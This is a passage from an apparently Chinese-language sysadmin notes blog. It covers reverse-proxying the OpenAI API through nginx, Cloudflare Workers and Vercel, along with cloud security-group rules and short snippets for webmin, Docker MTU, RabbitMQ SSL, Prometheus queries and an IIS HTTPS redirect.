</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    add_header Access-Control-Allow-Origin *;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    location / {
</span></span><span class="line"><span class="cl">        default_type &#39;application/json&#39;;
</span></span><span class="line"><span class="cl">        return 200 &#39;{&#34;status&#34;: &#34;ok&#34;}&#39;;
</span></span><span class="line"><span class="cl">    }
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    location /v1 {
</span></span><span class="line"><span class="cl">        proxy_pass https://api.openai.com;
</span></span><span class="line"><span class="cl">        proxy_ssl_server_name on;
</span></span><span class="line"><span class="cl">        proxy_set_header Host api.openai.com;
</span></span><span class="line"><span class="cl">        proxy_set_header X-Real-IP $remote_addr;
</span></span><span class="line"><span class="cl">    }
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    location ~ /openai/(.*) {
</span></span><span class="line"><span class="cl">        proxy_pass https://api.openai.com/$1$is_args$args;
</span></span><span class="line"><span class="cl">        proxy_set_header Host api.openai.com;
</span></span><span class="line"><span class="cl">        proxy_set_header X-Real-IP $remote_addr;
</span></span><span class="line"><span class="cl">        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
</span></span><span class="line"><span class="cl">        # 如果响应是流式的
</span></span><span class="line"><span class="cl">        proxy_set_header Connection &#39;&#39;;
</span></span><span class="line"><span class="cl">        proxy_http_version 1.1;
</span></span><span class="line"><span class="cl">        chunked_transfer_encoding off;
</span></span><span class="line"><span class="cl">        proxy_buffering off;
</span></span><span class="line"><span class="cl">        proxy_cache off;
</span></span><span class="line"><span class="cl">        # 如果响应是一般的
</span></span><span class="line"><span class="cl">        proxy_buffer_size 128k;
</span></span><span class="line"><span class="cl">        proxy_buffers 4 256k;
</span></span><span class="line"><span class="cl">        proxy_busy_buffers_size 256k;
</span></span><span class="line"><span class="cl">    }
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">}</span></span></code></pre></td></tr></table>
</div>
</div></li>
<li>
<p>利用<code>cloudflare</code>的<code>Workers</code>来实现</p>
<ul>
<li>登陆后在左侧栏中，选择<code>Workers</code>,点击<code>创建服务</code>,输入一个看着顺眼的服务名,选择<code>http处理程序</code>,然后点击<code>创建服务</code>.然后点击右上角<code>快速编辑</code>,在左侧框中填入一下代码，保存部署即可。</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-ts" data-lang="ts"><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">TELEGRAPH_URL</span> <span class="o">=</span> <span class="s1">&#39;https://api.openai.com&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">addEventListener</span><span class="p">(</span><span class="s1">&#39;fetch&#39;</span><span class="p">,</span> <span class="nx">event</span> <span class="o">=&gt;</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="nx">event</span><span class="p">.</span><span class="nx">respondWith</span><span class="p">(</span><span class="nx">handleRequest</span><span class="p">(</span><span class="nx">event</span><span class="p">.</span><span class="nx">request</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="p">})</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kr">async</span> <span class="kd">function</span> <span class="nx">handleRequest</span><span class="p">(</span><span class="nx">request</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">url</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">URL</span><span class="p">(</span><span class="nx">request</span><span class="p">.</span><span class="nx">url</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">url</span><span class="p">.</span><span class="nx">host</span> <span class="o">=</span> <span class="nx">TELEGRAPH_URL</span><span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="sr">/^https?:\/\//</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">modifiedRequest</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Request</span><span class="p">(</span><span class="nx">url</span><span class="p">.</span><span class="nx">toString</span><span class="p">(),</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">headers</span>: <span class="kt">request.headers</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="nx">method</span>: <span class="kt">request.method</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="nx">body</span>: <span class="kt">request.body</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="nx">redirect</span><span class="o">:</span> <span class="s1">&#39;follow&#39;</span>
</span></span><span class="line"><span class="cl"><span class="p">});</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">response</span> <span class="o">=</span> <span class="k">await</span> <span class="nx">fetch</span><span class="p">(</span><span class="nx">modifiedRequest</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">modifiedResponse</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Response</span><span class="p">(</span><span class="nx">response</span><span class="p">.</span><span class="nx">body</span><span class="p">,</span> <span class="nx">response</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// 添加允许跨域访问的响应头
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">modifiedResponse</span><span class="p">.</span><span class="nx">headers</span><span class="p">.</span><span class="kr">set</span><span class="p">(</span><span class="s1">&#39;Access-Control-Allow-Origin&#39;</span><span class="p">,</span> <span class="s1">&#39;*&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">return</span> <span class="nx">modifiedResponse</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
</div>
</div><ul>
<li>上诉步骤完成后，配置工作基本就算完成了，<code>cloudflare</code>会有一个默认的域名，但由于某些原因，可能访问效果不是很好，不过自定义域名可以解决，具体配置在<code>触发器</code>中。此处可以定义你自己想要设定的域名，不过，要定义自定义域名，你的域名<code>ns</code>需要指定到<code>cloudflare</code>中，后续内容自行研究。</li>
</ul>
</li>
<li>
<p><code>vercel</code> 反代<code>openai</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="c1">// vercel.json -- cmd: vercel --prod
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&#34;rewrites&#34;</span><span class="p">:</span> <span class="p">[</span>
</span></span><span class="line"><span class="cl">        <span class="p">{</span> <span class="nt">&#34;source&#34;</span><span class="p">:</span> <span class="s2">&#34;/&#34;</span><span class="p">,</span> <span class="nt">&#34;destination&#34;</span><span class="p">:</span> <span class="s2">&#34;https://api.openai.com&#34;</span> <span class="p">},</span>
</span></span><span class="line"><span class="cl">        <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nt">&#34;source&#34;</span><span class="p">:</span> <span class="s2">&#34;/:match*&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="nt">&#34;destination&#34;</span><span class="p">:</span> <span class="s2">&#34;https://api.openai.com/:match*&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="c1">// },
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="c1">// {
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="c1">//    &#34;source&#34;: &#34;/openai/:match*&#34;,
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="c1">//    &#34;destination&#34;: &#34;https://api.openai.com/:match*&#34;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
</div>
</div></li>
</ul>
<h2 id="云安全组配置规范" class="heading-element"><span>云安全组配置规范</span>
  <a href="#%e4%ba%91%e5%ae%89%e5%85%a8%e7%bb%84%e9%85%8d%e7%bd%ae%e8%a7%84%e8%8c%83" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><p>不同的云厂商他的云策略是有差异的，阿里云的云安全组是以优先级来判定的规则先后的(1-100)数字越小，优先级越高。腾讯云为顺序判定，与iptables类似，从上向下。亚马逊无要求，默认拒绝所有流量。需主动配置内外网策略(未详细测试)</p>
<p>云策略规则部署规范(以阿里云为例)</p>
<ol>
<li>默认放行所有公网出流量(此项默认，可不做修改。优先级:1 )</li>
<li>添加优先级<strong>最低的</strong>入口流量限制(所有协议。优先级: 100)</li>
<li>添加所有常用的可信端口(如:80、443。优先级: 90)</li>
<li>添加受信ip(如: 公司、监控机、堡垒机等IP。优先级: 1-50)</li>
</ol>
<p>注意事项:</p>
<ol>
<li>建议每个受信组单独建立一个安全组，方便管理。</li>
<li>建议配合云策略和服务器防火墙共同使用。</li>
</ol>
<h2 id="webmin-密码修改" class="heading-element"><span>webmin 密码修改</span>
  <a href="#webmin-%e5%af%86%e7%a0%81%e4%bf%ae%e6%94%b9" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><ul>
<li><code>/usr/libexec/webmin/changepass.pl /etc/webmin &lt;user&gt; &lt;passwd&gt;</code></li>
</ul>
<h2 id="记录一个nginx-反代规则" class="heading-element"><span>记录一个nginx 反代规则</span>
  <a href="#%e8%ae%b0%e5%bd%95%e4%b8%80%e4%b8%aanginx-%e5%8f%8d%e4%bb%a3%e8%a7%84%e5%88%99" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl"><span class="c1"># 请求 以 /example 开头的uri，反向代理到 http://127.0.0.1:8081/example 下</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">location ~ ^/example<span class="o">(</span>$<span class="p">|</span>/<span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">    proxy_pass http://127.0.0.1:8081<span class="nv">$request_uri</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    proxy_set_header Host <span class="nv">$host</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    proxy_set_header X-Real-IP <span class="nv">$remote_addr</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="o">}</span></span></span></code></pre></td></tr></table>
</div>
</div><h2 id="debian-pull-镜像-408-错误" class="heading-element"><span>debian pull 镜像 408 错误</span>
  <a href="#debian-pull-%e9%95%9c%e5%83%8f-408-%e9%94%99%e8%af%af" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># 不知道原因,解决方案如下</span>
</span></span><span class="line"><span class="cl"><span class="c1"># 参考地址: https://stackoverflow.com/questions/38386809/docker-error-http-408-response-body-invalid-character-looking-for-beginnin</span>
</span></span><span class="line"><span class="cl">sudo ip link <span class="nb">set</span> dev eth0 mtu <span class="m">1450</span></span></span></code></pre></td></tr></table>
</div>
</div><h2 id="在bash脚本中使用别名alias的方式" class="heading-element"><span>在bash脚本中使用别名(alias)的方式</span>
  <a href="#%e5%9c%a8bash%e8%84%9a%e6%9c%ac%e4%b8%ad%e4%bd%bf%e7%94%a8%e5%88%ab%e5%90%8dalias%e7%9a%84%e6%96%b9%e5%bc%8f" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># 打开alias支持</span>
</span></span><span class="line"><span class="cl"><span class="nb">shopt</span> -s expand_aliases</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="rabbitmq-ssl-证书配置" class="heading-element"><span>rabbitmq ssl 证书配置</span>
  <a href="#rabbitmq-ssl-%e8%af%81%e4%b9%a6%e9%85%8d%e7%bd%ae" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><blockquote>
<p><a href="https://www.cnblogs.com/hellxz/p/15776987.html"target="_blank" rel="external nofollow noopener noreferrer">https://www.cnblogs.com/hellxz/p/15776987.html<i class="fa-solid fa-external-link-alt fa-fw fa-xs ms-1 text-secondary" aria-hidden="true"></i></a></p>
</blockquote>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># ssl-server: </span>
</span></span><span class="line"><span class="cl">sh make_server_cert.sh rabbitmq-server &lt;server_passwd&gt;
</span></span><span class="line"><span class="cl"><span class="c1"># ssl-client:</span>
</span></span><span class="line"><span class="cl">sh create_client_cert.sh rabbitmq-client &lt;client_passwd&gt;</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="prometheus-不同指标计间的计算方法" class="heading-element"><span>prometheus 不同指标计间的计算方法</span>
  <a href="#prometheus-%e4%b8%8d%e5%90%8c%e6%8c%87%e6%a0%87%e8%ae%a1%e9%97%b4%e7%9a%84%e8%ae%a1%e7%ae%97%e6%96%b9%e6%b3%95" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-ini" data-lang="ini"><span class="line"><span class="cl"><span class="c1">## redis_memory_used_bytes Redis 内存使用量</span>
</span></span><span class="line"><span class="cl"><span class="c1">### redis_memory_used_bytes{cloudtype=&#34;阿里云&#34;, hostname=&#34;riecaeph0noo&#34;, instance=&#34;127.0.0.1:16370&#34;, job=&#34;RedisStatusMonitor&#34;, ostype=&#34;linux&#34;, services=&#34;redis&#34;} 3322384</span>
</span></span><span class="line"><span class="cl"><span class="c1">## node_memory_MemTotal_bytes 系统总内存</span>
</span></span><span class="line"><span class="cl"><span class="c1">###  node_memory_MemTotal_bytes{cloudtype=&#34;阿里云&#34;, hostname=&#34;riecaeph0noo&#34;, instance=&#34;1.1.1.1&#34;, job=&#34;ServerStatusMonitor&#34;, ostype=&#34;linux&#34;, services=&#34;server&#34;} 32868929536</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># 方法一: </span>
</span></span><span class="line"><span class="cl"><span class="c1">## 计算 Redis 内存使用量占主机内存总和的百分比(适用指标标签不一致的情况)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="na">redis_memory_used_bytes / on(hostname) group_left label_replace(node_memory_MemTotal_bytes, &#34;hostname_group&#34;, &#34;&#34;, &#34;hostname&#34;, &#34;(.*)&#34;) * 100 &gt; 90</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># 方法二: </span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="na">redis_memory_used_bytes / on(hostname) group_left node_memory_MemTotal_bytes</span></span></span></code></pre></td></tr></table>
</div>
</div><h2 id="iis-http-强制跳转-https" class="heading-element"><span>IIS http 强制跳转 https</span>
  <a href="#iis-http-%e5%bc%ba%e5%88%b6%e8%b7%b3%e8%bd%ac-https" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><ul>
<li>此项未校验,来源于<code>chatgpt</code></li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="nt">&lt;configuration&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="nt">&lt;system.webServer&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;rewrite&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="nt">&lt;rules&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&lt;rule</span> <span class="na">name=</span><span class="s">&#34;Force HTTPS&#34;</span> <span class="na">stopProcessing=</span><span class="s">&#34;true&#34;</span><span class="nt">&gt;</span>
</span></span><span class="line"><span class="cl">          <span class="nt">&lt;match</span> <span class="na">url=</span><span class="s">&#34;(.*)&#34;</span> <span class="nt">/&gt;</span>
</span></span><span class="line"><span class="cl">          <span class="nt">&lt;conditions&gt;</span>
</span></span><span class="line"><span class="cl">            <span class="nt">&lt;add</span> <span class="na">input=</span><span class="s">&#34;{HTTPS}&#34;</span> <span class="na">pattern=</span><span class="s">&#34;off&#34;</span> <span class="na">ignoreCase=</span><span class="s">&#34;true&#34;</span> <span class="nt">/&gt;</span>
</span></span><span class="line"><span class="cl">          <span class="nt">&lt;/conditions&gt;</span>
</span></span><span class="line"><span class="cl">          <span class="c">&lt;!-- 临时重定向 --&gt;</span>
</span></span><span class="line"><span class="cl">          <span class="c">&lt;!-- &lt;action type=&#34;Redirect&#34; redirectType=&#34;Temporary&#34; url=&#34;https://{HTTP_HOST}/{R:1}&#34; /&gt; --&gt;</span>
</span></span><span class="line"><span class="cl">          <span class="nt">&lt;action</span> <span class="na">type=</span><span class="s">&#34;Redirect&#34;</span> <span class="na">redirectType=</span><span class="s">&#34;Permanent&#34;</span> <span class="na">url=</span><span class="s">&#34;https://{HTTP_HOST}/{R:1}&#34;</span> <span class="nt">/&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&lt;/rule&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="nt">&lt;/rules&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;/rewrite&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="nt">&lt;/system.webServer&gt;</span>
</span></span><span class="line"><span class="cl"><span class="nt">&lt;/configuration&gt;</span></span></span></code></pre></td></tr></table>
</div>
</div><h2 id="find-文件性能提升" class="heading-element"><span>find 文件性能提升</span>
  <a href="#find-%e6%96%87%e4%bb%b6%e6%80%a7%e8%83%bd%e6%8f%90%e5%8d%87" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><div class="highlight"><div class="chroma">
